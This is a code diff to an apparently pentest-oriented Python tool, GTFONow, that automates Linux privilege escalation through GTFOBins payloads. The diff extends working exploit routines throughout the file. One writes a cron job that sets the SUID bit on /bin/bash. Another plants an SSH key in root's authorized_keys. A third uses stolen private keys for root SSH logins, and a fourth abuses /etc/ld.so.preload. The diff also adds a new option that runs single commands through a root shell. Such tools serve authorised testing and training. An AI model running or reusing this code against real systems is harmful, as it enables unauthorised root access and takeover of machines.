@@ -1862,21 +1862,16 @@ class CustomLogger(logging.Logger):
     def __init__(self, name, level=logging.DEBUG):
         super(CustomLogger, self).__init__(name, level)
 
-        # Create a console handler and set its level to DEBUG
         self.console_handler = logging.StreamHandler()
         self.console_handler.setLevel(logging.DEBUG)
 
-        # Create and set the custom formatter
         formatter = CustomFormatter()
         self.console_handler.setFormatter(formatter)
 
-        # Add the handler to the logger
         self.addHandler(self.console_handler)
 
     def set_level(self, level):
-        # Set the logger's level
         self.setLevel(level)
-        # Update the console handler's level
         self.console_handler.setLevel(level)
 
 
@@ -1930,7 +1925,7 @@ def execute_command(command):
         return None, "OS error occurred: " + str(e)
 
 
-def arbitrary_file_read(binary, payload, user="root"):
+def arbitrary_file_read(binary, payload, user="root", command=None):
     """Exploit arbitrary file read vulnerability.
 
     Args:
@@ -1946,7 +1941,7 @@ def arbitrary_file_read(binary, payload, user="root"):
     os.system(payload)
 
 
-def arbitrary_file_write(binary, payload, risk, user="root"):
+def arbitrary_file_write(binary, payload, risk, user="root", command=None):
     """Exploit arbitrary file write.
 
     Args:
@@ -1955,25 +1950,46 @@ def arbitrary_file_write(binary, payload, risk, user="root"):
         user (str): User to exploit.
     """
     log.info("Performing arbitrary file write with %s", binary)
-
+    options = []
     if risk == 2:
         if is_service_running("ssh"):
-            ssh_write_privesc(payload, user)
-        if user == "root":
-            if is_service_running("cron"):
-                cron_priv_esc(payload)
-            ld_preload_exploit(binary, payload)
+            options.append(("ssh", "Obtain shell by writing SSH key"))
+        if user == "root" and is_service_running("cron"):
+            options.append(("cron", "Obtain shell by writing to Cron"))
+        options.append(("ld_preload", "Obtain shell by writing to LD_PRELOAD"))
+        options.append(("arbitrary", "Arbitrary file Write (no shell)"))
+        print("\nSelect an exploit option:")
+        for idx, (option_code, description) in enumerate(options):
+            print(GREEN + "[" + str(idx) + "] " + RESET + description)
+        choice = get_user_choice("> ")
+        chosen_option = options[choice][0]
+        if chosen_option == "ssh":
+            ssh_write_privesc(payload, user, command)
+        elif chosen_option == "cron":
+            cron_priv_esc(payload, command)
+        elif chosen_option == "ld_preload":
+            ld_preload_exploit(binary, payload, command)
+        elif chosen_option == "arbitrary":
+            print("Create a file named " + GREEN + "input_file" +
+                  RESET + " containing the file content")
+            log.info(
+                "Spawning temporary shell to create file, type 'exit' when done")
+            print(
+                "Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
+            file_to_write = input("> ")
+            payload = payload.replace("file_to_write", file_to_write)
+            os.system(payload)
+    else:
+        print("Create a file named " + GREEN + "input_file" +
+              RESET + " containing the file content")
+        log.info("Spawning temporary shell to create file, type 'exit' when done")
+        print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
+        file_to_write = input("> ")
+        payload = payload.replace("file_to_write", file_to_write)
+        os.system(payload)
 
-    print("Create a file named " + GREEN + "input_file" +
-          RESET+" containing the file content")
-    log.info("Spawning temporary shell to create file, type 'exit' when done")
-    print("Enter the file path that you wish to write to. (eg: /root/.ssh/authorized_keys)")
-    file_to_write = input("> ")
-    payload = payload.replace("file_to_write", file_to_write)
-    os.system(payload)
 
-
-def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root"):
+def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root", command=None):
     """Exploit a binary.
 
     Args:
@@ -1983,20 +1999,35 @@ def exploit(binary,  payload, exploit_type, risk, binary_path=None, user="root")
         user (str, optional): User to exploit. Defaults to "root".
     """
 
-    if exploit_type == SUDO_NO_PASSWD and user:
+    if exploit_type == SUDO_NO_PASSWD and user != "root":
         payload = payload.replace("sudo", "sudo -u " + user)
-
+    print(payload)
     if binary_path:
         payload = payload.replace("./"+binary, binary_path)
     else:
         payload = payload.replace("./"+binary, binary)
     if "file_to_read" in payload:
-        arbitrary_file_read(binary, payload, user)
+        arbitrary_file_read(binary, payload, user, command)
     elif "file_to_write" in payload:
-        arbitrary_file_write(binary, payload, risk, user)
+        arbitrary_file_write(binary, payload, risk, user, command)
     else:
-        log.info("Spawning %s shell", user)
-        os.system(payload)
+        if command:
+            execute_privileged_command(payload, command)
+        else:
+            log.info("Spawning %s shell", user)
+            os.system(payload)
+
+
+def execute_privileged_command(payload, command):
+    process = subprocess.Popen(
+        payload, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
+    process.stdin.write(command + '\n')
+
+    out, err = process.communicate()
+    if out:
+        print('Output:', out)
+    if err:
+        print('Error:', err)
 
 
 def get_sudo_l_output():
@@ -2148,30 +2179,30 @@ def check_capability(binary_path, capability):
         return False
 
     except subprocess.CalledProcessError as e:
-        print(f"Error: {e}")
+        print("Error: %s", e)
         return False
 
 
 def is_service_running(service):
     """
-    Check if the cron service is running.
+    Check if a service is running.
 
     Returns:
-    bool: True if cron is running, False otherwise.
+    bool: True if service is running, False otherwise.
     """
 
     if get_binary_path("service"):
-        result = execute_command(["service", service, "status"])
+        result, error = execute_command(["service", service, "status"])
         if " is running" in result:
             return True
     if get_binary_path("systemctl"):
-        result = execute_command(["systemctl", "status", service])
+        result, error = execute_command(["systemctl", "status", service])
         if "active (running)" in result:
             return True
     return False
 
 
-def cron_priv_esc(payload):
+def cron_priv_esc(payload, command=None):
     """Turns arbitrary write into shell by writing to cron.
 
     Args:
@@ -2183,24 +2214,26 @@ def cron_priv_esc(payload):
     file_to_write = "/var/spool/cron/crontabs/root"
     payload = payload.replace("file_to_write", file_to_write)
     payload = payload.replace("DATA", "* * * * * chmod u+s /bin/bash")
-    log.debug("Executing %s", payload)
     log.info("Writing payload to crontab %s", file_to_write)
-    os.system(payload)
+    execute_command(payload)
     log.info("Waiting for cron to execute payload")
     count = 0
     while True:
         if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
             log.info("SUID bit set on /bin/bash, spawning root shell")
-            os.system("/bin/bash -p")
+            if command:
+                execute_privileged_command(payload, command)
+            else:
+                os.system("/bin/bash -p")
             break
         time.sleep(1)
         count = count + 1
-        if count > 80:
+        if count > 65:
             log.error("Cron did not execute payload, something went wrong.")
             break
 
 
-def ld_preload_exploit(binary, payload):
+def ld_preload_exploit(binary, payload, command=None):
     """Turns arbitrary write into shell by writing to /etc/ld.so.preload
 
     Args:
@@ -2243,7 +2276,10 @@ def ld_preload_exploit(binary, payload):
 
     if check_suid_sgid("/bin/bash").get("SUID") and check_suid_sgid("/bin/bash").get("Owner") == "root":
         log.info("SUID bit set on /bin/bash, spawning root shell")
-        os.system("/bin/bash -p")
+        if command:
+            execute_privileged_command("/bin/bash -p", command)
+        else:
+            os.system("/bin/bash -p")
 
 
 def check_cap_bins():
@@ -2313,7 +2349,7 @@ def check_cap_full_disk():
     return potential_privesc
 
 
-def ssh_write_privesc(payload, user="root"):
+def ssh_write_privesc(payload, user="root", command=None):
     """Turns arbitrary write into shell by writing to user's SSH key
 
     Args:
@@ -2334,17 +2370,21 @@ def ssh_write_privesc(payload, user="root"):
     execute_command("ssh-keygen -N '' -f /tmp/gtfokey")
     with open("/tmp/gtfokey.pub", "r") as f:
         pub_key = f.read()
+        pub_key = pub_key.strip()
         payload = payload.replace("DATA", pub_key)
         payload = payload.replace(
             "file_to_write", home_dir+"/.ssh/authorized_keys")
 
         res, err = execute_command(payload)
+        shell_payload = "ssh -o StrictHostKeyChecking=no -i /tmp/gtfokey "+user+"@localhost"
         if not err:
-            os.system(
-                "ssh -o StrictHostKeyChecking=no -i /tmp/gtfokey "+user+"@localhost")
+            if command:
+                execute_privileged_command(shell_payload, command)
+            else:
+                os.system(shell_payload)
 
 
-def ssh_key_privesc(payload, user="root"):
+def ssh_key_privesc(payload, user="root", command=None):
     """Turns arbitrary read into shell by reading user's SSH key.
 
     Args:
@@ -2365,12 +2405,16 @@ def ssh_key_privesc(payload, user="root"):
         exploit_payload = payload.replace("file_to_read", path)
         res, err = execute_command(exploit_payload)
         if not err:
-            priv_key = res
+            priv_key = res.strip()
             if "encrypted" in priv_key.lower():
                 log.error("Key %s is encrypted, skipping", path)
             log.info("Spawning %s SSH shell using %s", user, path)
-            os.system("ssh-agent bash -c \"ssh-add <(echo '" +
-                      priv_key+"') && ssh -o \"StrictHostKeyChecking=no\" "+user+"@localhost\"")
+            shell_payload = "ssh-agent bash -c \"ssh-add <(echo '" + priv_key + \
+                "') && ssh -o \"StrictHostKeyChecking=no\" "+user+"@localhost\""
+            if command:
+                execute_privileged_command(shell_payload, command)
+            else:
+                os.system(shell_payload)
 
 
 def payload_type(payload):
@@ -2500,7 +2544,7 @@ def check_suid_full_disk():
 
 
 def get_user_choice(prompt):
-    choice = input(prompt)
+    choice = input("\n"+prompt)
     return int(choice)
 
 
@@ -2518,12 +2562,14 @@ def print_banner():
 def parse_arguments():
     parser = argparse.ArgumentParser(
         description='GTFONow: Automatic privilege escalation using GTFOBins')
-    parser.add_argument('--level', default=1, choices=range(1, 2), type=int,
+    parser.add_argument('--level', default=1, choices=[1, 2], type=int,
                         help='Level of checks to perform. Default level 1 for a quick scan.')
-    parser.add_argument("--risk", default=1, choices=range(1, 2),
+    parser.add_argument("--risk", default=1, choices=[1, 2],
                         type=int, help="Risk level of exploit to perform. Default risk level 1 for safe operations.")
     parser.add_argument("--sudo_password", action="store_true",
                         help="If you know the sudo password, enable sudo_password mode for more privilege escalation options.")
+    parser.add_argument(
+        "--command", help="Rather than spawn an interactive shell, issue a single command. Mainly for debugging purposes only.")
     parser.add_argument('-v', '--verbose', action='store_true',
                         help='Enable verbose output.')
     return parser.parse_args()
@@ -2611,12 +2657,12 @@ def format_priv_esc_info(priv_esc):
 
     elif priv_type == "Capability":
         capability = priv_esc.get("Capability", "N/A")
-        info = f"Binary with capability {capability}"
+        info = "Binary with capability " + capability
 
     return info
 
 
-def execute_payload(priv_esc, risk):
+def execute_payload(priv_esc, risk, command=None):
     print("Choose payload:")
     for key, payload in enumerate(priv_esc["Payloads"]):
         print(GREEN + "[" + str(key) + "] " +
@@ -2626,10 +2672,10 @@ def execute_payload(priv_esc, risk):
     user = priv_esc.get("SudoUser") or priv_esc.get("Owner")
     if user:
         exploit(priv_esc["Binary"], priv_esc["Payloads"][choice], priv_esc["Type"], risk,
-                binary_path=priv_esc["Path"], user=user)
+                binary_path=priv_esc["Path"], user=user, command=command)
     else:
         exploit(priv_esc["Binary"], priv_esc["Payloads"][choice], priv_esc["Type"], risk,
-                binary_path=priv_esc["Path"])
+                binary_path=priv_esc["Path"], command=command)
 
 
 def main():
@@ -2647,7 +2693,7 @@ def main():
 
     choice = get_user_choice("> ")
     selected_priv_esc = priv_escs[choice]
-    execute_payload(selected_priv_esc, args.risk)
+    execute_payload(selected_priv_esc, args.risk, args.command)
 
 
 if __name__ == "__main__":
